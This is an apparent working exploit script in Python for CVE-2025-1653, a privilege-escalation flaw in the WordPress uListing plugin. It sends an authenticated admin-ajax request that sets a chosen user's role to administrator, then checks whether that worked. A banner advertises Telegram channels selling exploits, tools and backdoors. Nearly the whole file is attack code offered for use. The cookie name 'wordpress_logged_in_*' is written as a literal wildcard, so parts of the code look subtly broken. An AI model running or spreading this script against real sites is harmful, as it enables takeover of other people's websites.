import requests
import sys
from random import choice
from colorama import Fore, Style, init
redvulns = Fore.RED
grenvulns = Fore.GREEN

def exploit(target, user_id, phpsessid, wp_logged_in_cookie):
    url = target + "/wp-admin/admin-ajax.php"
    
    cookies = {
        'PHPSESSID': phpsessid,  
        'wordpress_logged_in_*': wp_logged_in_cookie 
    }
    
    data = {
        "action": "stm_listing_profile_edit",
        "user_id": user_id,
        "user_role": "administrator"
    }

    try:
        response = requests.post(url, data=data, cookies=cookies, timeout=5)

        if response.status_code == 200:
            print("  -  " + target + " --> " + grenvulns + "Vulnerable")
            r0l(target, user_id, cookies)
        else:
            print("  -  " + target + " --> " + redvulns + "Not_Vulnerable")

    except requests.exceptions.RequestException as e:
        print("  -  " + target + " --> " + redvulns + "Timeout")

def r0l(target, user_id, cookies):
    url = target + "/wp-admin/admin-ajax.php"
    data = {
        "action": "get_user_meta",
        "user_id": user_id
    }

    try:
        response = requests.post(url, data=data, cookies=cookies, timeout=5)
        if response.status_code == 200 and "administrator" in response.text:
            print("  -  " + target + " --> " + grenvulns + "Exploited Successfully")
        else:
            print("  -  " + target + " --> " + redvulns + "Not_Vulnerable")
    except requests.exceptions.RequestException:
        print("  -  " + target + " --> " + redvulns + "Timeout")
banner = '''
    
      
       -#-
        bY t.me/uncodeboss

             CVE-2025-1653 => [WordPress uListing Plugin] <= Privilege Escalation Explo1t

        	 [Notification] : Become a VP user and get all the exploits and tools, backdoors
	 t.me/realcodeb0ss . 35% Discount Prefer Code : 9QzkLw

      Join our new channel > t.me/realcodeb0ss , New exploits, tools, etc in there.

'''
if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(banner)
        print(" - [UsaGE > ] python codeb0ss_cve-2025-1653 [wp-website] <user_id> <PHPSESSID> <wordpress_logged_in_cookie>")
        sys.exit(1)

    target = sys.argv[1]
    user_id = sys.argv[2]
    phpsessid = sys.argv[3]
    wp_logged_in_cookie = sys.argv[4]

    exploit(target, user_id, phpsessid, wp_logged_in_cookie)
